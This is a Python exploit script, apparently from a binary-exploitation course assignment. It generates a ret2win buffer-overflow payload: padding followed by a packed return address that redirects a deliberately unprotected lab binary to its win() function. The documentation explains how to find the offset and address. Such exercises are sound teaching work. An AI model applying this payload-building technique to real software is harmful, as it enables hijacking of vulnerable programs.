#!/usr/bin/env python3
"""
make_payload.py -- generates a ret2win payload for legacy_log_parser.

Overwrites the saved return address on the stack with the address of
win(), preceded by `offset` bytes of padding to reach it.

Usage:
    python3 make_payload.py [-o OFFSET] [-w WIN_ADDR] [-f OUTFILE]

Defaults match this assignment's build (legacy_log_parser compiled with
-O0 -g -fno-stack-protector -no-pie): offset=152, win=0x4012b6.
Re-derive these with GDB (offset) and `nm ./legacy_log_parser | grep win`
(address) if you rebuild the binary and the layout changes.
"""

import argparse
import struct


def build_payload(offset: int, win_addr: int) -> bytes:
    padding = b"A" * offset
    ret_addr = struct.pack("<Q", win_addr)  # little-endian 8-byte address
    return padding + ret_addr


def main():
    parser = argparse.ArgumentParser(description="Generate a ret2win payload.")
    parser.add_argument("-o", "--offset", type=int, default=152,
                         help="bytes of padding before the saved return address (default: 152)")
    parser.add_argument("-w", "--win-addr", type=lambda x: int(x, 16), default=0x4012b6,
                         help="address of win(), as hex, e.g. 0x4012b6 (default: 0x4012b6)")
    parser.add_argument("-f", "--outfile", default="payload.bin",
                         help="output file path (default: payload.bin)")
    args = parser.parse_args()

    payload = build_payload(args.offset, args.win_addr)

    with open(args.outfile, "wb") as f:
        f.write(payload)

    print(f"[+] Wrote {len(payload)} bytes to {args.outfile}")
    print(f"    offset={args.offset}, win_addr=0x{args.win_addr:x}")


if __name__ == "__main__":
    main()
